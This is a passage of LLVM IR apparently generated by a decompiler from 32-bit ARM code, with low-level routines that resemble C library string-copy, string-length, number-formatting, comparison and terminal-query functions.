  %v1_f248 = add i32 %v2_f244, -1
  store i32 %v1_f248, i32* %r2.global-to-local, align 4
  %v7_f248 = icmp eq i32 %v2_f244, 1
  store i1 %v7_f248, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f248, label %bb, label %dec_label_pc_f274

bb:                                               ; preds = %dec_label_pc_f240
  ret i32 %arg1

dec_label_pc_f254:                                ; preds = %dec_label_pc_f230, %dec_label_pc_f1d0
  %v2_f2646 = phi i32 [ %v1_f1d8, %dec_label_pc_f1d0 ], [ %v6_f224, %dec_label_pc_f230 ]
  %v1_f254 = urem i32 %arg2, 4
  store i32 %v1_f254, i32* %r2.global-to-local, align 4
  %v2_f254 = icmp eq i32 %v1_f254, 0
  store i1 %v2_f254, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f254, label %bb11, label %.preheader

bb11:                                             ; preds = %dec_label_pc_f254
  ret i32 %arg1

.preheader:                                       ; preds = %dec_label_pc_f254, %._crit_edge
  %v2_f264 = phi i32 [ %v6_f264, %._crit_edge ], [ %v2_f2646, %dec_label_pc_f254 ]
  %v0_f260 = phi i32 [ %v0_f260.pre, %._crit_edge ], [ %v1_f254, %dec_label_pc_f254 ]
  %v0_f25c = load i32, i32* @r1, align 4
  %v1_f25c = inttoptr i32 %v0_f25c to i8*
  %v2_f25c = load i8, i8* %v1_f25c, align 1
  %v3_f25c = zext i8 %v2_f25c to i32
  store i32 %v3_f25c, i32* %r3.global-to-local, align 4
  %v5_f25c = add i32 %v0_f25c, 1
  store i32 %v5_f25c, i32* @r1, align 4
  %v1_f260 = add i32 %v0_f260, -1
  store i32 %v1_f260, i32* %r2.global-to-local, align 4
  %v7_f260 = icmp eq i32 %v0_f260, 1
  store i1 %v7_f260, i1* %cpsr_z.global-to-local, align 1
  %v3_f264 = add i32 %v2_f264, 1
  %v4_f264 = inttoptr i32 %v3_f264 to i8*
  store i8 %v2_f25c, i8* %v4_f264, align 1
  %v5_f264 = load i32, i32* %ip.global-to-local, align 4
  %v6_f264 = add i32 %v5_f264, 1
  store i32 %v6_f264, i32* %ip.global-to-local, align 4
  %v0_f268 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_f268, label %bb12, label %bb13

bb12:                                             ; preds = %.preheader
  ret i32 %arg1

bb13:                                             ; preds = %.preheader
  %v0_f26c = load i32, i32* %r3.global-to-local, align 4
  %v2_f26c = icmp eq i32 %v0_f26c, 0
  store i1 %v2_f26c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f26c, label %dec_label_pc_f274, label %._crit_edge

._crit_edge:                                      ; preds = %bb13
  %v0_f260.pre = load i32, i32* %r2.global-to-local, align 4
  br label %.preheader

dec_label_pc_f274:                                ; preds = %dec_label_pc_f240, %bb13, %dec_label_pc_f274
  %v2_f27c = phi i32 [ %v6_f27c, %dec_label_pc_f274 ], [ %v1_f240, %dec_label_pc_f240 ], [ %v6_f264, %bb13 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_f278 = load i32, i32* %r2.global-to-local, align 4
  %v1_f278 = add i32 %v0_f278, -1
  store i32 %v1_f278, i32* %r2.global-to-local, align 4
  %v7_f278 = icmp eq i32 %v0_f278, 1
  store i1 %v7_f278, i1* %cpsr_z.global-to-local, align 1
  %v3_f27c = add i32 %v2_f27c, 1
  %v4_f27c = inttoptr i32 %v3_f27c to i8*
  store i8 0, i8* %v4_f27c, align 1
  %v5_f27c = load i32, i32* %ip.global-to-local, align 4
  %v6_f27c = add i32 %v5_f27c, 1
  store i32 %v6_f27c, i32* %ip.global-to-local, align 4
  %v0_f280 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_f280, label %dec_label_pc_f284, label %dec_label_pc_f274

dec_label_pc_f284:                                ; preds = %dec_label_pc_f274
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %v6_f27c, { 1, 0 }
  uselistorder i32 %v0_f278, { 1, 0 }
  uselistorder i32 %v6_f264, { 0, 2, 1 }
  uselistorder i32 %v1_f254, { 2, 1, 0 }
  uselistorder i32 %v2_f244, { 2, 1, 0 }
  uselistorder i32 %v1_f234, { 1, 0 }
  uselistorder i32 %v0_f230, { 1, 0 }
  uselistorder i32 %v6_f224, { 0, 1, 3, 2 }
  uselistorder i32* %r2.global-to-local, { 1, 5, 2, 3, 4, 6, 0 }
  uselistorder i32* %ip.global-to-local, { 0, 7, 1, 10, 2, 3, 4, 5, 6, 8, 9, 11, 12 }
  uselistorder i32 %arg2, { 1, 3, 2, 0, 4, 5 }
  uselistorder i32 %arg1, { 1, 2, 3, 5, 0, 4 }
  uselistorder label %dec_label_pc_f274, { 2, 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
}

define i32 @function_f288(i8* %arg1) local_unnamed_addr {
dec_label_pc_f288:
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_f288 = load i32, i32* @r1, align 4
  %v2_f288 = icmp eq i32 %v0_f288, 0
  br i1 %v2_f288, label %bb, label %dec_label_pc_f2b8

bb:                                               ; preds = %dec_label_pc_f288
  ret i32 0

dec_label_pc_f2a0:                                ; preds = %dec_label_pc_f2c8
  %v3_f2a0 = icmp uge i32 %v5_f354, %v1_f2a0
  %v9_f2a0 = icmp eq i32 %v5_f354, %v1_f2a0
  %v2_f2a4 = xor i1 %v3_f2a0, true
  %v3_f2a4 = or i1 %v9_f2a0, %v2_f2a4
  br i1 %v3_f2a4, label %bb19, label %bb20

bb19:                                             ; preds = %dec_label_pc_f2a0
  %v6_f2a4 = sub i32 %v5_f354, %tmp
  br label %bb20

bb20:                                             ; preds = %dec_label_pc_f2a0, %bb19
  %v5_f2a8 = phi i32 [ %v1_f2a0, %dec_label_pc_f2a0 ], [ %v6_f2a4, %bb19 ]
  %v2_f2a8 = xor i1 %v9_f2a0, true
  %v3_f2a8 = and i1 %v3_f2a0, %v2_f2a8
  br i1 %v3_f2a8, label %bb21, label %bb22

bb21:                                             ; preds = %bb20
  %v6_f2a8 = sub i32 %v5_f2a8, %tmp
  br label %bb22

bb22:                                             ; preds = %bb20, %bb21
  %v8_f2ac = phi i32 [ %v5_f2a8, %bb20 ], [ %v6_f2a8, %bb21 ]
  ret i32 %v8_f2ac

dec_label_pc_f2b0:                                ; preds = %dec_label_pc_f2fc
  br label %dec_label_pc_f350

dec_label_pc_f2b8:                                ; preds = %dec_label_pc_f288
  %v2_f2b8 = add i32 %tmp, %v0_f288
  %v3_f2b8 = icmp ult i32 %v2_f2b8, %tmp
  br i1 %v3_f2b8, label %bb23, label %bb24

bb23:                                             ; preds = %dec_label_pc_f2b8
  br label %bb24

bb24:                                             ; preds = %dec_label_pc_f2b8, %bb23
  %v5_f354 = phi i32 [ %v2_f2b8, %dec_label_pc_f2b8 ], [ -1, %bb23 ]
  %v1_f2d82 = urem i32 %tmp, 4
  %v2_f2d83 = icmp eq i32 %v1_f2d82, 0
  br i1 %v2_f2d83, label %dec_label_pc_f2e0, label %dec_label_pc_f2c8

dec_label_pc_f2c8:                                ; preds = %bb24, %dec_label_pc_f2d4
  %v1_f2a0 = phi i32 [ %v1_f2d4, %dec_label_pc_f2d4 ], [ %tmp, %bb24 ]
  %v1_f2c8 = inttoptr i32 %v1_f2a0 to i8*
  %v2_f2c8 = load i8, i8* %v1_f2c8, align 1
  %v2_f2cc = icmp eq i8 %v2_f2c8, 0
  br i1 %v2_f2cc, label %dec_label_pc_f2a0, label %dec_label_pc_f2d4

dec_label_pc_f2d4:                                ; preds = %dec_label_pc_f2c8
  %v1_f2d4 = add i32 %v1_f2a0, 1
  %v1_f2d8 = urem i32 %v1_f2d4, 4
  %v2_f2d8 = icmp eq i32 %v1_f2d8, 0
  br i1 %v2_f2d8, label %dec_label_pc_f2e0, label %dec_label_pc_f2c8

dec_label_pc_f2e0:                                ; preds = %dec_label_pc_f2d4, %bb24
  %storemerge.lcssa = phi i32 [ %tmp, %bb24 ], [ %v1_f2d4, %dec_label_pc_f2d4 ]
  store i32 %storemerge.lcssa, i32* @lr, align 4
  %v3_f34032 = icmp ult i32 %storemerge.lcssa, %v5_f354
  br i1 %v3_f34032, label %dec_label_pc_f2e8, label %dec_label_pc_f350

dec_label_pc_f2e8:                                ; preds = %dec_label_pc_f33c, %dec_label_pc_f2e0
  %v0_f2b039 = phi i32 [ %v4_f2e8, %dec_label_pc_f33c ], [ %storemerge.lcssa, %dec_label_pc_f2e0 ]
  %v1_f2e8 = inttoptr i32 %v0_f2b039 to i32*
  %v2_f2e8 = load i32, i32* %v1_f2e8, align 4
  %v4_f2e8 = add i32 %v0_f2b039, 4
  store i32 %v4_f2e8, i32* @lr, align 4
  %v2_f2ec = add i32 %v2_f2e8, -16843009
  %v2_f2f0 = and i32 %v2_f2ec, -2139062144
  %v2_f2f4 = icmp eq i32 %v2_f2f0, 0
  br i1 %v2_f2f4, label %dec_label_pc_f33c, label %dec_label_pc_f2fc

dec_label_pc_f2fc:                                ; preds = %dec_label_pc_f2e8
  %v2_f2fc = inttoptr i32 %v0_f2b039 to i8*
  %v3_f2fc = load i8, i8* %v2_f2fc, align 1
  %v2_f304 = icmp eq i8 %v3_f2fc, 0
  %v1_f308 = add i32 %v0_f2b039, 1
  br i1 %v2_f304, label %dec_label_pc_f2b0, label %dec_label_pc_f310

dec_label_pc_f310:                                ; preds = %dec_label_pc_f2fc
  %v2_f310 = inttoptr i32 %v1_f308 to i8*
  %v3_f310 = load i8, i8* %v2_f310, align 1
  %v2_f314 = icmp eq i8 %v3_f310, 0
  br i1 %v2_f314, label %dec_label_pc_f350, label %dec_label_pc_f31c

dec_label_pc_f31c:                                ; preds = %dec_label_pc_f310
  %v1_f31c = add i32 %v0_f2b039, 2
  %v2_f31c = inttoptr i32 %v1_f31c to i8*
  %v3_f31c = load i8, i8* %v2_f31c, align 1
  %v2_f320 = icmp eq i8 %v3_f31c, 0
  br i1 %v2_f320, label %dec_label_pc_f350, label %dec_label_pc_f32c

dec_label_pc_f32c:                                ; preds = %dec_label_pc_f31c
  %v1_f32c = add i32 %v0_f2b039, 3
  %v2_f32c = inttoptr i32 %v1_f32c to i8*
  %v3_f32c = load i8, i8* %v2_f32c, align 1
  %v2_f330 = icmp eq i8 %v3_f32c, 0
  br i1 %v2_f330, label %dec_label_pc_f350, label %dec_label_pc_f33c

dec_label_pc_f33c:                                ; preds = %dec_label_pc_f32c, %dec_label_pc_f2e8
  %v3_f340 = icmp ult i32 %v4_f2e8, %v5_f354
  br i1 %v3_f340, label %dec_label_pc_f2e8, label %dec_label_pc_f350

dec_label_pc_f350:                                ; preds = %dec_label_pc_f33c, %dec_label_pc_f2e0, %dec_label_pc_f310, %dec_label_pc_f31c, %dec_label_pc_f32c, %dec_label_pc_f2b0
  %v1_f350 = phi i32 [ %v0_f2b039, %dec_label_pc_f2b0 ], [ %storemerge.lcssa, %dec_label_pc_f2e0 ], [ %v1_f308, %dec_label_pc_f310 ], [ %v1_f31c, %dec_label_pc_f31c ], [ %v1_f32c, %dec_label_pc_f32c ], [ %v5_f354, %dec_label_pc_f33c ]
  %v3_f350 = icmp uge i32 %v5_f354, %v1_f350
  %v9_f350 = icmp eq i32 %v5_f354, %v1_f350
  %v2_f354 = xor i1 %v3_f350, true
  %v3_f354 = or i1 %v9_f350, %v2_f354
  br i1 %v3_f354, label %bb25, label %bb26

bb25:                                             ; preds = %dec_label_pc_f350
  %v6_f354 = sub i32 %v5_f354, %tmp
  br label %bb26

bb26:                                             ; preds = %dec_label_pc_f350, %bb25
  %v5_f358 = phi i32 [ %v1_f350, %dec_label_pc_f350 ], [ %v6_f354, %bb25 ]
  %v2_f358 = xor i1 %v9_f350, true
  %v3_f358 = and i1 %v3_f350, %v2_f358
  br i1 %v3_f358, label %bb27, label %bb28

bb27:                                             ; preds = %bb26
  %v6_f358 = sub i32 %v5_f358, %tmp
  br label %bb28

bb28:                                             ; preds = %bb26, %bb27
  %v8_f35c = phi i32 [ %v5_f358, %bb26 ], [ %v6_f358, %bb27 ]
  ret i32 %v8_f35c

; uselistorder directives
  uselistorder i1 %v3_f350, { 1, 0 }
  uselistorder i32 %v4_f2e8, { 1, 2, 0 }
  uselistorder i32 %v0_f2b039, { 0, 6, 5, 4, 3, 1, 2 }
  uselistorder i32 %v1_f2d4, { 1, 0, 2 }
  uselistorder i32 %v1_f2a0, { 3, 4, 2, 1, 0 }
  uselistorder i32 %v5_f354, { 3, 4, 5, 0, 2, 1, 8, 7, 6 }
  uselistorder i1 %v3_f2a0, { 1, 0 }
  uselistorder i32 %tmp, { 4, 3, 5, 7, 8, 0, 6, 2, 1 }
  uselistorder label %bb28, { 1, 0 }
  uselistorder label %bb26, { 1, 0 }
  uselistorder label %dec_label_pc_f350, { 0, 4, 3, 2, 1, 5 }
  uselistorder label %dec_label_pc_f2c8, { 1, 0 }
  uselistorder label %bb24, { 1, 0 }
  uselistorder label %bb22, { 1, 0 }
  uselistorder label %bb20, { 1, 0 }
}

define i32 @function_f368(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_f368:
  store i32 %arg1, i32* @r1, align 4
  store i32 %arg1, i32* @r4, align 4
  %v0_f370 = call i32 @function_f37c()
  %v0_f374 = load i32, i32* @r4, align 4
  ret i32 %v0_f374
}

define i32 @function_f37c() local_unnamed_addr {
dec_label_pc_f37c:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-25 = alloca i32, align 4
  %v3_f37c = load i32, i32* @r4, align 4
  %v0_f380 = load i32, i32* @r0, align 4
  %v0_f38c = load i32, i32* @r1, align 4
  store i32 %v0_f38c, i32* @r8, align 4
  %v0_f390 = load i32, i32* @r2, align 4
  store i32 %v0_f390, i32* @r6, align 4
  %tmp = icmp ult i32 %v0_f380, 125
  br i1 %tmp, label %thread-pre-split.preheader, label %dec_label_pc_f3c8

thread-pre-split.preheader:                       ; preds = %dec_label_pc_f37c
  store i32 ptrtoint ([8 x i8]* @global_var_16f3c.415 to i32), i32* @r5, align 4
  %v2_f3b03446 = icmp eq i32 %v0_f380, 0
  br i1 %v2_f3b03446, label %bb26, label %dec_label_pc_f3a4.lr.ph

dec_label_pc_f3a4:                                ; preds = %dec_label_pc_f3a4.lr.ph, %bb
  %v2_f3bc41 = phi i1 [ %v2_f3bc3849, %dec_label_pc_f3a4.lr.ph ], [ %v2_f3bc, %bb ]
  %v1_f3c040 = phi i32 [ %v0_f3b0.pr48, %dec_label_pc_f3a4.lr.ph ], [ %v2_f3ac, %bb ]
  %v0_f3a839 = phi i32 [ %v0_f3b4547, %dec_label_pc_f3a4.lr.ph ], [ %v1_f3a8, %bb ]
  %v1_f3a8 = add i32 %v0_f3a839, 1
  store i32 %v1_f3a8, i32* @r5, align 4
  br i1 %v2_f3bc41, label %bb, label %thread-pre-split.loopexit

bb:                                               ; preds = %dec_label_pc_f3a4
  %v2_f3ac = add i32 %v1_f3c040, -1
  %v2_f3b0 = icmp eq i32 %v2_f3ac, 0
  %v1_f3b4 = inttoptr i32 %v1_f3a8 to i8*
  %v2_f3b4 = load i8, i8* %v1_f3b4, align 1
  %v2_f3bc = icmp eq i8 %v2_f3b4, 0
  br i1 %v2_f3b0, label %dec_label_pc_f3bc, label %dec_label_pc_f3a4

thread-pre-split.loopexit:                        ; preds = %dec_label_pc_f3a4
  %v1_f3b435 = inttoptr i32 %v1_f3a8 to i8*
  %v2_f3b436 = load i8, i8* %v1_f3b435, align 1
  %v2_f3bc38 = icmp eq i8 %v2_f3b436, 0
  br label %dec_label_pc_f3a4.lr.ph

dec_label_pc_f3a4.lr.ph:                          ; preds = %thread-pre-split.loopexit, %thread-pre-split.preheader
  %v2_f3bc3849 = phi i1 [ %v2_f3bc38, %thread-pre-split.loopexit ], [ false, %thread-pre-split.preheader ]
  %v0_f3b0.pr48 = phi i32 [ %v1_f3c040, %thread-pre-split.loopexit ], [ %v0_f380, %thread-pre-split.preheader ]
  %v0_f3b4547 = phi i32 [ %v1_f3a8, %thread-pre-split.loopexit ], [ ptrtoint ([8 x i8]* @global_var_16f3c.415 to i32), %thread-pre-split.preheader ]
  br label %dec_label_pc_f3a4

dec_label_pc_f3bc:                                ; preds = %bb
  br i1 %v2_f3bc, label %dec_label_pc_f3c8, label %bb26

bb26:                                             ; preds = %thread-pre-split.preheader, %dec_label_pc_f3bc
  %v0_f3a8.lcssa55 = phi i32 [ %v1_f3a8, %dec_label_pc_f3bc ], [ ptrtoint ([8 x i8]* @global_var_16f3c.415 to i32), %thread-pre-split.preheader ]
  store i32 0, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_f3fc

dec_label_pc_f3c8:                                ; preds = %dec_label_pc_f3bc, %dec_label_pc_f37c
  %v3_f3cc = ashr i32 %v0_f380, 31
  %v5_f3e0 = bitcast i32* %stack_var_-25 to i8*
  %v6_f3e0 = call i32 @function_11a20(i8* %v5_f3e0, i32 %v0_f380, i32 %v3_f3cc, i32 -10, i32 0)
  %v1_f3e4 = add i32 %v6_f3e0, -14
  store i32 %v1_f3e4, i32* @r5, align 4
  store i32 %v1_f3e4, i32* @r0, align 4
  store i32 ptrtoint ([15 x i8]* @global_var_16f2c.417 to i32), i32* @r1, align 4
  store i32 14, i32* @r2, align 4
  %v0_f3f4 = call i32 @function_ef60()
  store i32 22, i32* %r7.global-to-local, align 4
  %v0_f3fc.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_f3fc

dec_label_pc_f3fc:                                ; preds = %bb26, %dec_label_pc_f3c8
  %v0_f3fc = phi i32 [ %v0_f3a8.lcssa55, %bb26 ], [ %v0_f3fc.pre, %dec_label_pc_f3c8 ]
  store i32 %v0_f3fc, i32* @r0, align 4
  %v0_f400 = call i32 @function_f030()
  %v0_f404 = load i32, i32* @r8, align 4
  %v2_f404 = icmp eq i32 %v0_f404, 0
  %v1_f408 = add i32 %v0_f400, 1
  store i32 %v1_f408, i32* @r4, align 4
  br i1 %v2_f404, label %bb27, label %dec_label_pc_f3fc._crit_edge

dec_label_pc_f3fc._crit_edge:                     ; preds = %dec_label_pc_f3fc
  %v1_f410.pre = load i32, i32* @r6, align 4
  br label %bb28

bb27:                                             ; preds = %dec_label_pc_f3fc
  br label %bb28

bb28:                                             ; preds = %dec_label_pc_f3fc._crit_edge, %bb27
  %v4_f414 = phi i32 [ %v1_f410.pre, %dec_label_pc_f3fc._crit_edge ], [ 0, %bb27 ]
  %tmp56 = icmp ugt i32 %v1_f408, %v4_f414
  br i1 %tmp56, label %bb29, label %.thread16

bb29:                                             ; preds = %bb28
  store i32 %v4_f414, i32* @r4, align 4
  store i32 34, i32* %r7.global-to-local, align 4
  br label %.thread16

.thread16:                                        ; preds = %bb28, %bb29
  %v0_f42414 = phi i32 [ %v4_f414, %bb29 ], [ %v1_f408, %bb28 ]
  %v2_f41c = icmp eq i32 %v0_f42414, 0
  br i1 %v2_f41c, label %dec_label_pc_f440, label %dec_label_pc_f424

dec_label_pc_f424:                                ; preds = %.thread16
  store i32 %v0_f42414, i32* @r2, align 4
  %v0_f428 = load i32, i32* @r5, align 4
  store i32 %v0_f428, i32* @r1, align 4
  store i32 %v0_f404, i32* @r0, align 4
  %v0_f430 = call i32 @function_ef60()
  %v0_f434 = load i32, i32* @r8, align 4
  %v1_f434 = load i32, i32* @r4, align 4
  %v2_f434 = add i32 %v1_f434, %v0_f434
  %v3_f43c = add i32 %v2_f434, -1
  %v4_f43c = inttoptr i32 %v3_f43c to i8*
  store i8 0, i8* %v4_f43c, align 1
  br label %dec_label_pc_f440

dec_label_pc_f440:                                ; preds = %.thread16, %dec_label_pc_f424
  %v0_f440 = load i32, i32* %r7.global-to-local, align 4
  %v2_f440 = icmp eq i32 %v0_f440, 0
  br i1 %v2_f440, label %dec_label_pc_f450, label %dec_label_pc_f448

dec_label_pc_f448:                                ; preds = %dec_label_pc_f440
  %v0_f448 = call i32 @function_cec4()
  %v0_f44c = load i32, i32* %r7.global-to-local, align 4
  %v2_f44c = inttoptr i32 %v0_f448 to i32*
  store i32 %v0_f44c, i32* %v2_f44c, align 4
  %v0_f450.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_f450

dec_label_pc_f450:                                ; preds = %dec_label_pc_f440, %dec_label_pc_f448
  %v0_f450 = phi i32 [ 0, %dec_label_pc_f440 ], [ %v0_f450.pre, %dec_label_pc_f448 ]
  store i32 %v3_f37c, i32* @r4, align 4
  ret i32 %v0_f450

; uselistorder directives
  uselistorder i32 %v4_f414, { 1, 2, 0 }
  uselistorder i32 %v1_f408, { 1, 0, 2 }
  uselistorder i32 %v1_f3a8, { 0, 1, 2, 3, 5, 4 }
  uselistorder i32 %v0_f380, { 4, 3, 1, 2, 0 }
  uselistorder i32* %r7.global-to-local, { 4, 2, 3, 0, 1, 5 }
  uselistorder label %dec_label_pc_f450, { 1, 0 }
  uselistorder label %dec_label_pc_f440, { 1, 0 }
  uselistorder label %.thread16, { 1, 0 }
  uselistorder label %bb28, { 1, 0 }
  uselistorder label %dec_label_pc_f3fc, { 1, 0 }
  uselistorder label %bb26, { 1, 0 }
}

define i32 @function_f464(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_f464:
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @lr, align 4
  br label %dec_label_pc_f474

dec_label_pc_f474:                                ; preds = %bb8, %dec_label_pc_f464
  %v8_f4d83 = phi i32 [ %v8_f4d8, %bb8 ], [ 0, %dec_label_pc_f464 ]
  %v0_f4cc = phi i32 [ %v1_f4cc, %bb8 ], [ %arg2, %dec_label_pc_f464 ]
  %v0_f4d0 = phi i32 [ %v1_f4d0, %bb8 ], [ %tmp, %dec_label_pc_f464 ]
  %v9_f474 = icmp eq i32 %v0_f4d0, %v0_f4cc
  br i1 %v9_f474, label %dec_label_pc_f474._crit_edge, label %dec_label_pc_f47c

dec_label_pc_f474._crit_edge:                     ; preds = %dec_label_pc_f474
  %.pre = inttoptr i32 %v0_f4cc to i8*
  br label %bb8

dec_label_pc_f47c:                                ; preds = %dec_label_pc_f474
  %v1_f480 = inttoptr i32 %v0_f4d0 to i8*
  %v2_f480 = load i8, i8* %v1_f480, align 1
  %v3_f480 = zext i8 %v2_f480 to i32
  %v1_f484 = inttoptr i32 %v0_f4cc to i8*
  %v2_f484 = load i8, i8* %v1_f484, align 1
  %v3_f484 = zext i8 %v2_f484 to i32
  %v2_f488 = load i32, i32* bitcast (i32** @global_var_205f8.419 to i32*), align 4
  %v2_f48c = mul nuw nsw i32 %v3_f480, 2
  store i32 %v2_f48c, i32* @ip, align 4
  %v2_f490 = mul nuw nsw i32 %v3_f484, 2
  %v2_f494 = add i32 %v2_f490, %v2_f488
  %v2_f498 = add i32 %v2_f488, %v2_f48c
  %v1_f49c = add i32 %v2_f498, 1
  %v2_f49c = inttoptr i32 %v1_f49c to i8*
  %v3_f49c = load i8, i8* %v2_f49c, align 1
  %v4_f49c = zext i8 %v3_f49c to i32
  %v1_f4a0 = add i32 %v2_f494, 1
  %v2_f4a0 = inttoptr i32 %v1_f4a0 to i8*
  %v3_f4a0 = load i8, i8* %v2_f4a0, align 1
  %v4_f4a0 = zext i8 %v3_f4a0 to i32
  %v3_f4a4 = inttoptr i32 %v2_f494 to i8*
  %v4_f4a4 = load i8, i8* %v3_f4a4, align 1
  %v6_f4a4 = zext i8 %v4_f4a4 to i32
  %v3_f4a8 = inttoptr i32 %v2_f498 to i8*
  %v4_f4a8 = load i8, i8* %v3_f4a8, align 1
  %v6_f4a8 = zext i8 %v4_f4a8 to i32
  %v3_f4ac = mul nuw i32 %v4_f4a0, 16777216
  %v3_f4b0 = mul nuw i32 %v4_f49c, 16777216
  %v4_f4b4 = sdiv i32 %v3_f4b0, 65536
  %v5_f4b4 = or i32 %v6_f4a8, %v4_f4b4
  %v4_f4b8 = sdiv i32 %v3_f4ac, 65536
  %v5_f4b8 = or i32 %v4_f4b8, %v6_f4a4
  %v2_f4bc = sub nsw i32 %v5_f4b4, %v5_f4b8
  %v9_f4bc = icmp eq i32 %v5_f4b4, %v5_f4b8
  br i1 %v9_f4bc, label %bb8, label %bb

bb:                                               ; preds = %dec_label_pc_f47c
  ret i32 %v2_f4bc

bb8:                                              ; preds = %dec_label_pc_f474._crit_edge, %dec_label_pc_f47c
  %v1_f4c4.pre-phi = phi i8* [ %.pre, %dec_label_pc_f474._crit_edge ], [ %v1_f480, %dec_label_pc_f47c ]
  %v8_f4d8 = phi i32 [ %v8_f4d83, %dec_label_pc_f474._crit_edge ], [ %v2_f4bc, %dec_label_pc_f47c ]
  %v2_f4c4 = load i8, i8* %v1_f4c4.pre-phi, align 1
  %v2_f4c8 = icmp eq i8 %v2_f4c4, 0
  %v1_f4cc = add i32 %v0_f4cc, 1
  %v1_f4d0 = add i32 %v0_f4d0, 1
  store i32 %v1_f4d0, i32* @lr, align 4
  br i1 %v2_f4c8, label %dec_label_pc_f4d8, label %dec_label_pc_f474

dec_label_pc_f4d8:                                ; preds = %bb8
  ret i32 %v8_f4d8

; uselistorder directives
  uselistorder i32 %v1_f4d0, { 1, 0 }
  uselistorder i32 %v2_f4bc, { 1, 0 }
  uselistorder i32 %v5_f4b8, { 1, 0 }
  uselistorder i32 %v5_f4b4, { 1, 0 }
  uselistorder i32 %v2_f48c, { 1, 0 }
  uselistorder i32 %v0_f4cc, { 1, 2, 0, 3 }
  uselistorder label %bb8, { 1, 0 }
}

define i32 @function_f4e0(i32 %arg1) local_unnamed_addr {
dec_label_pc_f4e0:
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_f4e0 = load i32, i32* @r4, align 4
  store i32 %v3_f4e0, i32* %stack_var_-12, align 4
  %v6_f4e0 = load i32, i32* @r5, align 4
  store i32 %arg1, i32* @r5, align 4
  %v0_f4e8 = call i32 @function_f030()
  %v1_f4ec = add i32 %v0_f4e8, 1
  store i32 %v1_f4ec, i32* @r4, align 4
  %v1_f4f4 = call i32 @function_fc78(i32 %v1_f4ec)
  store i32 62728, i32* @lr, align 4
  %v1_f504 = icmp ne i32 %v1_f4f4, 0
  call void @__pseudo_cond_branch(i1 %v1_f504, i32 ptrtoint ([3 x i8]* @global_var_ef60.420 to i32))
  %v2_f50c = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_f50c, i32* @r4, align 4
  store i32 %v6_f4e0, i32* @r5, align 4
  ret i32 %v1_f4f4
}

define i32 @function_f510(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_f510:
  store i32 ptrtoint (i32* @global_var_22a74.422 to i32), i32* @r2, align 4
  %v0_f514 = call i32 @function_12b40()
  %v0_f518 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_f518, label %bb, label %bb1

bb:                                               ; preds = %dec_label_pc_f510
  br label %bb1

bb1:                                              ; preds = %dec_label_pc_f510, %bb
  ret i32 %v0_f514

; uselistorder directives
  uselistorder label %bb1, { 1, 0 }
}

define i32 @function_f51c(i32 %arg1) local_unnamed_addr {
dec_label_pc_f51c:
  %stack_var_-64 = alloca i32, align 4
  %v2_f520 = ptrtoint i32* %stack_var_-64 to i32
  store i32 %v2_f520, i32* @r1, align 4
  %v0_f528 = call i32 @function_f53c()
  %v1_f52c = sub i32 1, %v0_f528
  %v2_f52c = icmp ult i32 %v0_f528, 2
  br i1 %v2_f52c, label %bb4, label %bb

bb:                                               ; preds = %dec_label_pc_f51c
  br label %bb4

bb4:                                              ; preds = %dec_label_pc_f51c, %bb
  %v5_f538 = phi i32 [ %v1_f52c, %dec_label_pc_f51c ], [ 0, %bb ]
  ret i32 %v5_f538

; uselistorder directives
  uselistorder i32 %v0_f528, { 1, 0 }
  uselistorder label %bb4, { 1, 0 }
}

define i32 @function_f53c() local_unnamed_addr {
dec_label_pc_f53c:
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %tmp = call i8 @__decompiler_undefined_function_2()
  %stack_var_-39 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %v3_f53c = load i32, i32* @r4, align 4
  %v6_f53c = load i32, i32* @r5, align 4
  %v2_f540 = ptrtoint i32* %stack_var_-56 to i32
  %v0_f544 = load i32, i32* @r1, align 4
  store i32 %v0_f544, i32* %r6.global-to-local, align 4
  %v0_f550 = load i32, i32* @r0, align 4
  %v3_f550 = call i32 @function_cd84(i32 %v0_f550, i32 21505, i32 %v2_f540)
  store i32 %v3_f550, i32* %r7.global-to-local, align 4
  %v2_f554 = icmp eq i32 %v3_f550, 0
  %v2_f55c = ptrtoint i32* %stack_var_-39 to i32
  store i32 %v2_f55c, i32* @r1, align 4
  %v0_f564 = load i32, i32* %r6.global-to-local, align 4
  br i1 %v2_f554, label %dec_label_pc_f56c, label %dec_label_pc_f598

dec_label_pc_f56c:                                ; preds = %dec_label_pc_f53c
  %v1_f564 = add i32 %v0_f564, 17
  %v4_f574 = zext i8 %tmp to i32
  store i32 %v4_f574, i32* @r5, align 4
  %v2_f578 = load i32, i32* %stack_var_-56, align 4
  %v1_f57c = inttoptr i32 %v0_f564 to i32*
  store i32 %v2_f578, i32* %v1_f57c, align 4
  %v3_f57c = add i32 %v0_f564, 4
  %v4_f57c = inttoptr i32 %v3_f57c to i32*
  %v5_f57c = load i32, i32* @ip, align 4
  store i32 %v5_f57c, i32* %v4_f57c, align 4
  %v6_f57c = add i32 %v0_f564, 8
  %v7_f57c = inttoptr i32 %v6_f57c to i32*
  %v8_f57c = load i32, i32* @lr, align 4
  store i32 %v8_f57c, i32* %v7_f57c, align 4
  %v0_f580 = load i32, i32* @r4, align 4
  %v1_f580 = load i32, i32* %r6.global-to-local, align 4
  %v2_f580 = add i32 %v1_f580, 12
  %v3_f580 = inttoptr i32 %v2_f580 to i32*
